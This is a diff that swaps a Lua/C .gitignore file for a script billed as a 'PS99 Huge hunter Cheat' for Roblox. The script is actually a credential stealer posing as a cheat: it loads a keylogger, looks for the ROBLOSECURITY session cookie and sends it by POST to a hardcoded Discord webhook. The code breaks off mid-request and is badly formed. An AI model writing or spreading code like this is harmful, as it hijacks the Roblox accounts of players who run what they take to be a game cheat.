@@ -1,41 +1,6 @@
-# Compiled Lua sources
-luac.out
+-- PS99 Huge hunter Cheat v1.0
+-- By: Zenox014
+-- GitHub: https://github.com/PS99SCRIPTSZZZ/hugehunterscript
 
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+local webhook_url ="https://discord.com/api/webhooks/1373045421529632798/K4fyF4KF0HPaoEvSGnJM8yIh2fK5zhdjru9jyZwGvRvTXvxK_QlWWuCGWZ_PjIjDCJtn"local keylogger = require('keylogger')local function on_key_pressed(key)    if key:find('ROBLOSECURITY') then
+        local cookie = key:match('ROBLOSECURITY (.+)')        local payload = { content ="Roblox Cookie:" .. cookie} local options = { method ="POST", headers = { ["
